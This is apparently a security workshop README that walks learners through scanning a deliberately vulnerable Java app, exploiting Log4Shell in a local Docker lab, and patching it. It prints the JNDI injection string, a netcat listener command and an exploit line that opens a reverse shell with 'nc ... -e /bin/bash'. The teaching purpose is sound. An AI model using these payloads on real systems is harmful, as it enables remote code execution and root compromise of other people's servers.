# VGW Techtonic 2022 - Vulnerabilities

The purpose of this workshop is to educate you on the risks that software vulnerabilities pose and how they are introduced. We will focus on how to find these vulnerabilities within your applications and exploiting them. You will also be taught how to patch these vulnerabilities and reducing your attack surface to mitigate risk.

## 1. Setup

To get started, you will need to build the project using the following instructions below.

1. Download the project:
   - Open up a terminal
   - Enter `git clone https://github.com/kimberleyhallifax/techtonic22-vulnerabilities.git`
   - Enter `cd techtonic22-vulnerabilities/`
2. Open Docker Desktop
3. Build using one of the following options below;

### Option 1 - from source code (recommended)

Enter the following command to build the source code and container images in your terminal window:

```shell
docker-compose build
```

### Option 2 - using pre-built images from USB

1. Copy the files for this workshop from the USB drive into the `techtonic22-vulnerabilities/images/` folder
2. Run the following commands to load the pre-built container images into Docker:

    ```shell
    docker load -i images/exploit.tar
    docker load -i images/listener.tar
    docker load -i images/scanner.tar
    docker load -i images/app-vulnerable.tar
    docker load -i images/app-fixed.tar
    ```

## 2. Learning Outcomes

The software we create, deploy and operate today is not just made up of the code we write, or to some degree the environment in which it runs.  We depend on other software libraries in order to interface with other systems or add functionality at a reduced cost.  It's often "cheaper" to reuse a software library than write the functionality yourself, however there are risks associated with this.  In software engineering we need to balance and manage these risks.

**What is a vulnerability?**

A weakness in software that allows an attacker to do something they shouldn't be able to. This could be elevation of privileges, access to restricted data, etc.

**What is a dependency?**

A dependency is code someone else has written but that we're including in our application. In `.java` files these look like `import org.apache.logging.log4j.Logger;`

**What is a container?**

A container is an isolated process running in its own environment, with dependencies and code packaged together.

**Why is it important to scan for vulnerabilities?**

Having less vulnerabilities in our code means our application is more resilient to hacks, more reliable, and keeps sensitive data safe.

### 2.1 Where Vulnerabilities are Introduced

A typical web application is often made up of the source code we write, the software libraries (dependencies) we use and a container image providing the environment in which the application runs.

We will look at how to scan and identify vulnerabilities in our;

- Dependencies
- Container images
- Source code

### 2.2 Vulnerability Exploitation

Once a vulnerabilty has been identified, what does exploitation look like?  What might be involved for an attacker? How might we be able to identify an attack is taking place?

We'll run through the steps exploiting a vulnerability within our application to show what is possible, demonstrating risk.

### 2.3 Remediating Vulnerabilities

Once a vulnerability has been identified and the risk assessed against our application, we can select an appropriate risk mitigation technique such as;

- Patching the impacted software libraries
- Refactoring the effected code

and evaluate (attempt to exploit) again to confirm it has been fixed.

### 2.4 Reducing our Dependencies

Attackers like to "live off the land", using the other applications bundled in our environment.  If our container image is only running our application, do we really need `curl`, `wget` or `bash` shell?  Removing these additional binaries can raise the barrier for an attacker to be successful.  What would be the minimal environment to run your application?

## 3. Our Vulnerable Application

### Run the Application

Once your application is built using either Option 1 or Option 2, lets take a look at this simple web form.

1. In the `techtonic22-vulnerabilities/` folder in your terminal enter:

    ```shell
    docker-compose up
    ```

2. Navigate to [http://localhost:8080](http://localhost:8080) in your web browser.  You will see a web form like the following;

    <img width="281" alt="Screen Shot 2022-08-23 at 11 25 30 pm" src="https://user-images.githubusercontent.com/49122574/186198388-2531a660-ee6d-4ef8-b443-5edc4d8319ed.png">

Give some inputs a go! Can you see the values entered anywhere?

### Application Overview

#### Source Code

Open `techtonic22-vulnerabilities/app/src/main/java/co/vgw/techtonic/Main.java` in an code editor (like VSCode) or a text editor, what functionality can we identify?

1. The application declares a logger.  A logger typically aids an engineer when there are issues with the service.

    ```java
    private static final Logger logger = LogManager.getLogger(Main.class);
    ```

2. There are two functions `doGet` and `doPost`.
3. `doGet` returns HTML which looks like the web form we experimented with earlier.
4. `doPost` writes the reponse we saw in the browser and logs the input values.  Did you see these in the terminal earlier?

#### Dependencies (Software Libraries)

At the top of the `Main.java` file, we can see a number of `import` statements like;

```java
import org.apache.logging.log4j.Logger;
```

These represent other software libraries or classes of code we depend on.  How do we know what are external or their version?

This project uses the Maven build system, open `techtonic22-vulnerabilities/app/pom.xml` in a code editor or a text editor.  

If we look inside the `app/pom.xml` file we can see the `<dependencies>...</dependencies>` section indicating the
package name and version.

### Summary

1. We ran our vulnerable application with `docker-compose up` and interacted with the web form.
2. The output of the web form appeared in the terminal window where we executed `docker-compose up`.
3. The source code had a logger and two functions.  The logger wrote the input to the terminal window.  The two functions served the content to the browser.
4. Our application had a few dependencies that are listed in the applications manifest file (`pom.xml`).

## 4. Vulnerability Scanning (Outcome 2.1)

> **Note**
>
> We have provided a container image with the installed utilities used in this section.  In a **new** terminal window in the `techtonic22-vulnerabilities/` folder enter;
>
> ```shell
> docker-compose exec scanner sh
> ```
>
> The commands in the following sections **A**, **B**, and **C** are exeucted in this shell.

### A) Dependencies

#### Software Bill of Materials (SBoM)

Earlier we looked at the `app/pom.xml` file to see our application dependencies.  Each programming language ecosystem often has its own package manifest, for example `package.json` in NodeJS or `requirements.txt` in Python.

Rather than manually inspecting these package manifest files individually to identify dependencies and versions, what if we could do this automatically.  You might be familiar with a Bill of Materials (BoM) in other engineering disciplines, or even building flat pack furniture!  It lists "what's included".  In software engineering we have the same thing called a **Software Bill of Materials (SBoM)**.

There are many tools to create SBoMs, we're going to use `syft` which can produce output in a number of different SBoM
formats.

In the scanner shell terminal window enter the following command `syft packages file:app/pom.xml`.  You should see similar output to that below.

```
/techtonic22-vulnerabilities # syft packages file:app/pom.xml

   ✔ Indexed app/pom.xml     
   ✔ Cataloged packages      [5 packages]

   NAME                       VERSION  TYPE         
   javax.servlet-api          4.0.1    java-archive  
   log4j-api                  2.12.0   java-archive  
   log4j-core                 2.12.0   java-archive  
   tomcat-embed-core          8.5.81   java-archive  
   tomcat-embed-logging-juli  8.5.2    java-archive  
```

#### Scanning SBoMs for Vulnerabilities

How do I know if these open source dependencies have any vulnerabilities and put our application at risk? We can use the SBoM generated by `syft` with a public vulnerability database, matching dependency versions with known issues using another tool called `grype`.

`grype` matches software dependencies and their versions with known published vulnerabilities effecting it.  Using our automatically generated SBoM we can scan for vulnerabilities in our dependencies.

Run `syft` and pipe the output into `grype`.  In your scanner terminal window enter;

```shell
syft packages file:app/pom.xml -o json | grype
```

Or we can run `grype` directly on the package manifest file (`grype file:app/pom.xml`) and get similar output below

```
/techtonic22-vulnerabilities # grype file:app/pom.xml

   ✔ Vulnerability DB        [no update available]
   ✔ Indexed app/pom.xml     
   ✔ Cataloged packages      [5 packages]
   ✔ Scanned image           [5 vulnerabilities]
   NAME        INSTALLED  FIXED-IN  TYPE          VULNERABILITY        SEVERITY 
   log4j-core  2.12.0     2.13.2    java-archive  GHSA-vwqq-5vrc-xw9h  Low       
   log4j-core  2.12.0     2.12.2    java-archive  GHSA-7rjr-3q55-vv33  Critical  
   log4j-core  2.12.0     2.12.4    java-archive  GHSA-8489-44mv-ggj8  Medium    
   log4j-core  2.12.0     2.12.2    java-archive  GHSA-jfh8-c2jp-5v3q  Critical  
   log4j-core  2.12.0     2.12.3    java-archive  GHSA-p6xc-xr62-6r2g  High
```

Uh oh! Looks like we have some vulnerabilities in `log4j-core`.  Log4j is the applications logging library.  Let's
take a look at the GitHub Security Advisory (GHSA)
[GHSA-8489-44mv-ggj8](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q) and what impact it might have:

>Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

We can also see that this vulnerability is listed as a CVE (Common Vulnerabilities and Exposures) on NIST's (National Institute of Standards and Technology) National Vulnerability Database (NVD):
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

We saw log4j earlier logging the web form input, our application might really be vulnerable!  We will continue with other vulnerability discovery techniques and then move on to exploitation, to see if this really impacts our application.

**What is CVE?**

CVE is a glossary that classifies vulnerabilities. It is maintained by the MITRE Corporation and vulnerabilities are analysed by NIST.

**What does the `SEVERITY` column inform us of?**

This column informs us of the risk associated with the vulnerability where **Risk = Impact * Likelihood**.

Risks need to be mitigated in an appropriate timeframe according to the level of the risk. Critical vulnerabilities (high impact) located in an important asset (e.g. a game that reaps 80% of your company's income) with a high likelihood of exploitation should be mitigated within 24 hours.

### B) Container Image

We've looked at scanning our application dependencies, what about the environment in which the application runs?  We execute our application within a container.

Open `app/Dockerfile` in your code editor or text editor.  We can see the line;

```Dockerfile
FROM openjdk:8u181-slim-stretch
```

What additional dependencies does this introduce?  What vulnerabilities are associated with these? We can reuse `grype` to scan a container images for vulnerabilities too.

> **NOTE**
> If you used Option 1 (building from source code) save the vulnerable application container image with
> `docker save -o images/app-vulnerable.tar t22v-app:vulnerable` in a new terminal window in the `techtonic22-vulnerabilities/` folder.

In our scanner shell terminal window execute;

```shell
grype docker-archive:images/app-vulnerable.tar
```

Yikes!  Whilst some of these findings are associated with the Java runtime, there are a lot of other utilities with vulnerabilities which are just not necesasry for our application, a simple web form.  Selecting the right base container image or minimising the included packages not only creates a smaller container image in size but also attack surface!

### C) Source Code using Static Application Security Testing (SAST)

We've looked at two methods for identifying vulnerabilities in our application.  These however foucsed on software dependencies, what about our own code?  Static Application Security Testing (SAST) is a technique to identify vulnerabilities in source code.

`semgrep` is an open source SAST tool that identifies security issues based on known bad patterns.  We can use `semgrep` to scan our application source code to identify any issues.

In our scanner shell terminal window execute `semgrep --config auto app/src`.

You should see similar output to below;

```
Findings:

  app/src/main/java/co/vgw/techtonic/Main.java 
     java.lang.security.audit.crlf-injection-logs.crlf-injection-logs
        When data from an untrusted source is put into a logger and not neutralized correctly, an
        attacker could forge log entries or include malicious content.
        Details: https://sg.run/wek0

         48┆ logger.info(req.getParameter("firstName"));
          ⋮┆----------------------------------------
         49┆ logger.info(req.getParameter("lastName"));
          ⋮┆----------------------------------------
         50┆ logger.info(req.getParameter("emailId"));
          ⋮┆----------------------------------------
         51┆ logger.info(req.getParameter("password"));
```

Our initial vulnerability scans of software dependencies and container images highlighted Log4j vulnerabilities.  Additionally, `semgrep` highlighted;

> an attacker could forge log entries **or include malicious content**.

in our source code, where request parameters are being passed into logging statements.  It seems like we should try and exploit this to find out if we are at risk!

### Summary

In this section we;

- Created a Software Bill of Materials (SBoM) using `syft` of our application.
- Scanned our software dependencies for vulnerabilities using the SBoM coupled with a vulnerability database using `grype`.
- Identified additional dependencies introduced in our environment through the base container image.
- Used `semgrep` to perform Static Application Security Testing (SAST) to highlight vulnerable lines of code.

## 3. Vulnerability Exploitation (Outcome 2.2)

### Exploitation

Whilst we will not be going into the specifics of the Log4j vulnerability in this lesson, know that in the vulnerable versions of this library, it allows us to reference remote code and have this executed in the context of the application.  We call this Remote Code Execution (RCE) and is considered perhaps one of the most severe type of vulnerability.

In the Log4j vulnerability this can be triggered in our application with the special string;

```
${jndi:ldap://exploit:1389/Exploit}
```

which needs to be passed into the Log4j logging library. What parameters were logged?  Could we try this in our registration form?

<img width="982" alt="Screen Shot 2022-09-01 at 12 07 38 pm" src="https://user-images.githubusercontent.com/49122574/187829554-16548070-c060-4950-90e4-a983341e4e43.png">

The exploit will connect to our attackers machine we call the `listener`.  This will allow us to execute commands as if we were inside the application container.

1. Open another terminal window in the `techtonic22-vulnerabilities/` folder.
2. Start the listener to wait for a connection for when the vulnerability is exploited.  Run the following commands in this new terminal window.

    ```shell
    docker-compose exec listener sh
    ```

    ```shell
    nc -lnvp 4444
    ```

3. Navigate to [http://localhost:8080](http://localhost:8080) in your web browser.
4. Enter the special payload `${jndi:ldap://exploit:1389/Exploit}` into one of the fields and click 'register'.

You will note this time, the page doesn't immediately redirect to the success page, what's happened? Check your listener terminal window you will see something similar to;

```
Connection from 172.22.0.2 39424 received!
```

In the listener shell if we type `ls` we can start to see the contents of the application server!  We're in!

See what privileges we have. Run `whoami` command:

```
whoami
root
```

We can see that we have root access.

### Summary

In this section we;

- Exploited log4j and got remote code execution within our application.
- Confirmed the vulnerability identified and demonstrated the risk.

## 4. Remediating Vulnerabilities (Outcome 2.3)

### Patching/Updating Software Dependencies

Often the vendor for the software dependency you use in your application has issued a patch or updated the library to remediate the vulnerability.  However, you still need to update your application to use this new or patched version.

Having a dependency management strategy is key to ensure not only the library is up-to-date allowing you to inexpensively use new features a vendor provides, but also known vulnerabilities are fixed over time.

You might have noticed in the output of `grype` a `FIXED` column, which provides helpful guidance on a potential dependency version to remeidate the issue.

In the case of [log4j-core](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core), the package repository also indicates vulnerabilities associated with versions of the library.  We can see;

>2.18.x | 2.18.0 | vulnerabilities (none)

Version 2.18.0 is likely a good candidate for us to upgrade to.

#### How do we update our dependency versions?

Going back into the `<dependencies>...</dependencies>` of our `app/pom.xml` file and changing the `<version>2.12.0</version>` line to `<version>2.18.0</version>` and should look similar to;

```xml
    ...
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.18.0</version>
    </dependency>

    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-api</artifactId>
      <version>2.18.0</version>
    </dependency>
    ...
```

### Refactoring the Code

Our application is intentionally written to be vulnerable but consider the code we write.

```java
logger.info(req.getParameter("firstName"));
```

Do we really need to log this information? Perhaps there's another way to acheive our outcome by not using the vulnerable code path in a dependency.  Often, we might get alerted to vulnerabilities in our applications for functionality we don't even use!

#### Sanitising User Input

Users (or attackers) could submit anything to our application.  Sanitising user input is a technique to "clean" the data before we make use of it.  For example, what if we removed all `$`, `{` and `}` characters, this may have mitigated this vulnerability, but ensuring data submitted to our application meets a specification is key.  Maybe we only allow certain characters or numbers, or remove and escape others.

### Fixing the Application

1. Update the dependency in the package manifest (`app/pom.xml`) as described in the section above.
2. Optionally, refactor the code, perhaps remove the logging lines or if you are familiar with Java, sanitise the input.
3. Stop the application, in the terminal window showing the application logs hit `Ctrl+C`.
4. In the same terminal enter `docker compose down` to clean up the resources.
5. Open `docker-compose.yml` in a code editor and replace the word `vulnerable` on line 5 with `fixed`.

> **NOTE**
> If you are building the source code (option 1 from setup) you need to compile the software again.
> Run `docker-compose build app`.  Once complete run `docker save -o images/app-fixed.tar t22v-app:fixed`.

1. Start the application `docker-compose up`.
2. In another terminal window enter `docker-compose exec scanner sh`.
3. Scan our application and container image for vulnerabilities;
    ```
    grype file:app/pom.xml
    ```

    ```
    grype docker-archive:images/app-fixed.tar
    ```
4. Repeat the exploitation steps from section 3, do you get remote code exeuction this time?  What happens?

### Summary

In this section we;

- Updated the Log4j dependencies in our application
- Optionally removed the logging lines
- Performed a vulnerability scan on our application and container image
- Attempted exploitation of the vulnerability to confirm it has been resolved

## 5. Reducing our Dependencies (Outcome 2.4)

Let's go back to our vulnerable application's `app/Dockerfile` file and check if we're using all of the dependencies we've downloaded. This line is interesting... don't we use netcat in our exploitation?

```Dockerfile
RUN apt-get update && apt-get install -y netcat
```

Do we even use netcat in our vulnerable application? Let's check. If we look at our vulnerability application's run file `app/src/main/java/co/vgw/techtonic/Main.java` and do a `Ctrl+F` for `netcat`, we can see that our application doesn't even use netcat! So let's go ahead and remove that installation line from the Dockerfile.

Now let's double if our suspicions are correct and have a look at our exploitation file `exploit/src/main/resources/exploit/Exploit.java`. On line 9 we can see the following code.

```
java.lang.Runtime.getRuntime().exec("nc listener 4444 -e /bin/bash").waitFor();
```

We were right! This line executes a netcat command on our vulnerable container to initiate the reverse shell connection (exploitation) to our own machine, giving us access to the vulnerable container with root privileges! If that hadn't been installed on the vulnerable container, that command would not have worked. So even though netcat does not contain the vulnerability we're exploiting, the installation gave us a pathway to initiate the reverse shell connection using the log4j vulnerability.

Try running `syft packages docker-archive:images/app-fixed.tar` what other applications and utilities are installed and included in our container image that we likely don't need?

There are open source projects such as [Distroless](https://github.com/GoogleContainerTools/distroless) which focus on building a bare minimum container image for your application runtime.

## 7. Cleanup

 Shut down your running containers, in the terminal with the application logs, type `Ctrl+C`.  Then enter `docker-compose down` to remove all resources.

The container images can be removed from docker with;

```
docker rmi t22v-app:fixed t22v-app:vulnerable t22v-scanner:latest t22v-listener:latest t22v-exploit:latest
```

## 8. What did we learn?

Yay! Great job. You are on the path to becoming a great engineer by considering security as part of your software development life-cycle.

1. First we were able to list all the dependencies in our application by generating an SBoM using `syft`.
2. Performed a vulnerability scan of the SBoM using `grype`.
3. We also used `grype` to scan our container image and found quite a few more vulnerabilities we didn't know were there!
4. Next, we scanned our source code for vulnerabilities using `semgrep` and discovered that we were in fact vulnerable to the vulnerability listed in the log4j dependency.
5. We successfully exploited the vulnerability to demonstrate its risk.
6. Lastly, we patched the vulnerability by updating our dependency version and re-ran the exploit to find that it no longer worked.
